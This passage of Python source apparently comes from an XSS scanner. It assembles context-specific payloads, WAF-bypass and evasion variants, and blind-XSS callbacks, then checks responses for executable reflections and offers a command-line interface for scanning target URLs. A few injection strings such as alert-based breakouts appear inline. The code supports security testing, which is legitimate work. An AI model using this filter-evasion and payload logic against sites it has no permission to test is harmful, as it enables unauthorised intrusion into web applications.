                "attr_single": "attr_single",
                "attr_unquoted": "html",
                "js_double": "js_double",
                "js_single": "js_single",
                "js_template": "js_double",
                "js_code": "js_double",
                "url": "url",
                "html_comment": "html",
                "css": "html",
            }
            key = ctx_map.get(ctx, "html")
            base = LEGACY_PAYLOADS.get(key, LEGACY_PAYLOADS["html"])
            polyglots = LEGACY_PAYLOADS.get("polyglot", [])

        # Filter payloads based on filter profile
        if filter_profile and FILTER_ANALYZER_AVAILABLE:
            base = filter_payloads_for_profile(base, filter_profile)
            polyglots = filter_payloads_for_profile(polyglots, filter_profile)

        # Add base payloads
        for p in base:
            result.append((p, ""))

        # Add polyglots
        for p in polyglots:
            result.append((p, ""))

        # Add WAF bypass payloads - ALWAYS add these, don't filter them!
        # WAF bypass payloads are specifically designed to evade filters
        if waf and ULTIMATE_AVAILABLE:
            waf_bypasses = get_waf_bypass_payloads(waf)
            # NOTE: Do NOT filter WAF bypass payloads - they're designed to bypass!
            for p in waf_bypasses:
                result.append((p, f"waf_{waf}"))

        # Add blind XSS payloads if callback URL provided
        if self.config.blind_callback:
            blind_payloads = generate_blind_payloads(self.config.blind_callback)
            for p in blind_payloads:
                result.append((p, "blind_xss"))

        # Load custom payloads from file if provided
        if self.config.custom_payloads:
            try:
                with open(self.config.custom_payloads) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            result.append((line, "custom"))
            except Exception as e:
                if self.config.verbose:
                    print(f"[WARN] Could not load custom payloads: {e}", file=sys.stderr)

        # Add evasion variants - ALWAYS add these, they're designed to bypass filters!
        if waf and self.config.waf_evasion:
            if self._waf_engine:
                # Use advanced evasion engine - generate WAF-specific bypass variants
                # Don't filter these - the whole point is bypassing the filter!
                for p in base[:15]:  # More base payloads for evasion
                    for evaded_result in self._waf_engine.evade_for_waf(p, waf, max_variants=8):
                        result.append((evaded_result.payload, evaded_result.technique))
            else:
                # Use legacy evasion
                for p in base[:10]:
                    for name, fn in LEGACY_EVASIONS.items():
                        try:
                            evaded = fn(p)
                            if evaded != p:
                                result.append((evaded, name))
                        except:
                            pass

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for item in result:
            if item[0] not in seen:
                seen.add(item[0])
                unique.append(item)

        return unique

    def _check_xss(self, payload: str, body: str, ctx: str) -> bool:
        """Check if XSS payload is exploitable (strict verification to avoid false positives)."""
        body_lower = body.lower()
        payload_lower = payload.lower()

        # CRITICAL: First check if payload is reflected at all
        if payload not in body and payload_lower not in body_lower:
            return False

        # Check if payload is only URL-encoded in a JavaScript string (NOT exploitable)
        # e.g., "search=%3Csvg%20onload%3Dalert(1)%3E" is NOT XSS
        from urllib.parse import quote
        url_encoded = quote(payload, safe='')
        if url_encoded in body and payload not in body:
            # Payload is only present in URL-encoded form (like in a JS variable), not reflected as HTML
            return False

        # IMPORTANT: Check for HTML encoding - if payload is encoded, it's NOT executable
        # Build the fully HTML-encoded version of payload
        encoded_payload = (payload
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#39;"))
        # Also check html.escape() style (uses &#x27; for single quote)
        encoded_payload_alt = (payload
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;"))

        # IMPORTANT: HTML encoding effectiveness depends on CONTEXT
        # - For HTML context: encoding < > = sanitized (can't create new tags)
        # - For event handler JS context: encoding quotes is NOT effective!
        #   Browsers decode HTML entities BEFORE passing to JS engine
        #   So onload="func('&#39;);alert(1)')" -> JS sees func('');alert(1)//')

        is_event_handler_context = ctx in ("js_single", "js_double", "js_eventhandler_single", "js_eventhandler_double")

        if "&lt;" in body:
            # If < and > are encoded, HTML tag payloads are blocked
            if encoded_payload in body or encoded_payload_alt in body:
                # BUT if we're in event handler context and payload doesn't need < >,
                # the quote encoding doesn't matter - browser decodes before JS execution
                if is_event_handler_context and "<" not in payload and ">" not in payload:
                    # Payload like ');alert(1)// doesn't need < >, quote encoding won't help
                    # Check if the payload with decoded quotes would be reflected
                    pass  # Don't return False, let the payload through
                else:
                    return False  # Fully sanitized, not exploitable
            # Even partial encoding of < > is enough to kill HTML tag payloads
            if "<" in payload:
                # Check if the < was encoded but rest might be there
                partial_check = payload.replace("<", "&lt;").replace(">", "&gt;")
                if partial_check in body:
                    return False

        # For event handler contexts, check if quote-only encoded payloads are present
        # These ARE exploitable because browsers decode entities before JS execution
        if is_event_handler_context and "<" not in payload and ">" not in payload:
            # Build quote-only encoded version
            quote_encoded = payload.replace("'", "&#39;").replace('"', "&quot;")
            quote_encoded_alt = payload.replace("'", "&#x27;").replace('"', "&quot;")
            if quote_encoded in body or quote_encoded_alt in body:
                return True  # Exploitable! Browser decodes before JS execution

        # Skip non-XSS payloads (SSTI probes, etc.)
        if payload in ("{{7*7}}", "{{constructor.constructor('alert(1)')()}}", "${7*7}", "#{7*7}"):
            return False  # These are SSTI/template injection, not XSS

        # Skip CSS expression payloads (only work in ancient IE6/IE7)
        if "expression(" in payload_lower:
            return False  # Not exploitable in modern browsers

        # Check for filter replacement patterns (common WAF/filter behavior)
        # If dangerous patterns were replaced with "blocked", "removed", "filtered", etc.
        filter_replacements = ["blocked=", "blocked:", "removed=", "filtered=", "sanitized="]
        for replacement in filter_replacements:
            if replacement in body_lower:
                # Check if this replacement corresponds to our payload
                # e.g., onerror= -> blocked= or javascript: -> blocked:
                if "onerror=" in payload_lower or "onload=" in payload_lower:
                    if "blocked=" in body_lower:
                        return False
                if "javascript:" in payload_lower:
                    if "blocked:" in body_lower:
                        return False

        # === SCRIPT TAG PAYLOADS ===
        if "<script" in payload_lower:
            # Must have intact <script>...</script> with code inside
            if re.search(r'<script[^>]*>[^<]*alert', body_lower):
                return True
            # Also check for </script> breakout payloads
            if re.search(r'</script\s*>\s*<script', body_lower):
                return True

        # === EVENT HANDLER PAYLOADS ===
        # For payloads with event handlers, verify the handler is intact (not blocked/replaced)
        event_handlers = [
            "onerror", "onload", "onfocus", "onclick", "onmouseover",
            "ontoggle", "onstart", "onbegin", "onmouseenter", "onpointerenter",
            "onfocusin", "onanimationstart", "onanimationend", "ontransitionend",
            "onfinish", "onpageshow", "onauxclick"
        ]
        for handler in event_handlers:
            if handler in payload_lower:
                # Check if the handler is present AND followed by = and some code
                pattern = rf'{handler}\s*=\s*["\']?[^"\']*(?:alert|confirm|prompt|eval|document|window)'
                if re.search(pattern, body_lower):
                    return True

        # === JAVASCRIPT: PROTOCOL ===
        if "javascript:" in payload_lower:
            # Must be in href/src/action attribute context
            if re.search(r'(?:href|src|action|formaction)\s*=\s*["\']?\s*javascript:', body_lower):
                return True
            # Also check for newline/tab bypass (javascript\n:)
            if re.search(r'javascript[\s\n\t]*:', body_lower):
                return True

        # === SVG PAYLOADS ===
        if "<svg" in payload_lower:
            # Check for SVG with event handler
            if re.search(r'<svg[^>]*\bon\w+\s*=', body_lower):
                return True
            # SVG with nested script
            if re.search(r'<svg[^>]*>.*<script', body_lower, re.DOTALL):
                return True

        # === IMG PAYLOADS ===
        if "<img" in payload_lower:
            if re.search(r'<img[^>]*\bonerror\s*=', body_lower):
                return True

        # === DETAILS/TOGGLE PAYLOADS ===
        if "<details" in payload_lower:
            if re.search(r'<details[^>]*\bontoggle\s*=', body_lower):
                return True

        # === INPUT/FOCUS PAYLOADS ===
        if "<input" in payload_lower:
            if re.search(r'<input[^>]*\bonfocus\s*=', body_lower):
                return True

        # === BODY TAG PAYLOADS ===
        if "<body" in payload_lower:
            if re.search(r'<body[^>]*\bonload\s*=', body_lower):
                return True

        # === IFRAME PAYLOADS ===
        if "<iframe" in payload_lower:
            if re.search(r'<iframe[^>]*(?:src|srcdoc)\s*=', body_lower):
                return True

        # === JAVASCRIPT CONTEXT BREAKOUT ===
        # For JS string context, check if we successfully broke out
        if ctx in ("js_single", "js_double", "js_template"):
            # Closing quote followed by code execution
            if re.search(r'["\'];\s*alert\s*\(', body_lower):
                return True
            if re.search(r'["\'];\s*alert\s*`', body_lower):
                return True
            # Script tag breakout from JS context
            if "</script>" in payload_lower and re.search(r'</script\s*>\s*<script', body_lower):
                return True

        # === ATTRIBUTE CONTEXT BREAKOUT ===
        if ctx in ("attr_single", "attr_double", "attr_unquoted"):
            # Check if we broke out of attribute with "> or '>
            if '"><' in payload or "'><" in payload:
                # Verify the tag injection worked
                if re.search(r'["\']>\s*<(?:script|img|svg|body|input|details)', body_lower):
                    return True

        return False

    def _inject(self, url: str, param: str, value: str) -> str:
        """Inject value into URL param."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="XSSForge XScan v2.0 - Ultimate XSS Scanner (500+ payloads)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Presets:
  quick        - Fast scan (~20 payloads, no filter analysis)
  standard     - Balanced scan (~50 payloads, smart filtering)
  thorough     - Deep scan (~200 payloads, full analysis)
  comprehensive - Maximum coverage (~500 payloads)

Examples:
  # Basic scan
  xssforge scan -u "https://target.com/?q=test"

  # Thorough scan with browser verification
  xssforge scan -u "https://target.com/?q=test" --preset thorough --browser

  # Pipeline usage
  cat urls.txt | xssforge scan --format json > results.json

  # Disable smart filtering (faster but less accurate)
  xssforge scan -u "https://target.com/?q=test" --no-smart-filter
        """
    )
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-l", "--list", help="File with URLs (one per line)")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("-t", "--timeout", type=float, default=10, help="Request timeout")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests")
    parser.add_argument("--max-payloads", type=int, default=50, help="Max payloads per param")
    parser.add_argument("--preset", choices=["quick", "standard", "thorough", "comprehensive"],
                       default="standard", help="Scan preset")
    parser.add_argument("--browser", action="store_true", help="Verify with headless browser")
    parser.add_argument("--no-waf-evasion", action="store_true", help="Disable WAF evasion")
    parser.add_argument("--no-smart-filter", action="store_true", help="Disable smart filter analysis")
    parser.add_argument("--smart", action="store_true", help="Smart mode: enable DOM XSS, form discovery, API scanning")
    parser.add_argument("--dom", action="store_true", help="Enable DOM XSS scanning")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-s", "--silent", action="store_true", help="Only output findings")
    parser.add_argument("--format", choices=["text", "json", "jsonl"], default="text",
                       help="Output format")

    args = parser.parse_args()

    # Collect URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        with open(args.list) as f:
            urls.extend(line.strip() for line in f if line.strip() and not line.startswith('#'))
    if not urls and not sys.stdin.isatty():
        urls = sys.stdin

    if not urls:
        parser.print_help()
        sys.exit(1)

    # Check browser availability
    if args.browser and not BROWSER_AVAILABLE:
        print("[WARN] Browser verification unavailable. Install: pip install playwright && playwright install chromium", file=sys.stderr)
        args.browser = False

    # Run scanner
    scanner = XScan(
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose,
        waf_evasion=not args.no_waf_evasion,
        max_payloads=args.max_payloads,
        preset=args.preset,
        use_browser=args.browser,
        smart_filter=not args.no_smart_filter,
        smart_mode=args.smart,
        scan_dom=args.dom or args.smart,  # --dom or --smart enables DOM scanning
    )

    if not args.silent:
        payload_count = get_payload_count() if ULTIMATE_AVAILABLE else "~60"
        print(f"[*] XSSForge XScan v2.0 ({payload_count} payloads)", file=sys.stderr)
        print(f"[*] Preset: {args.preset}", file=sys.stderr)
        if args.browser:
            print(f"[*] Browser verification: enabled", file=sys.stderr)

    findings = asyncio.run(scanner.scan(urls))

    if not args.silent:
        print(f"\n[*] Found {len(findings)} XSS vulnerabilities", file=sys.stderr)

    # Output results
    if args.format == "json" and args.output:
        with open(args.output, 'w') as f:
            json.dump([f.to_json() for f in findings], f, indent=2)
        print(f"[*] Results saved to {args.output}", file=sys.stderr)
    elif args.format == "jsonl":
        for f in findings:
            print(json.dumps(f.to_json()))
    elif args.output:
        with open(args.output, 'w') as f:
            json.dump([f.to_json() for f in findings], f, indent=2)
        print(f"[*] Results saved to {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
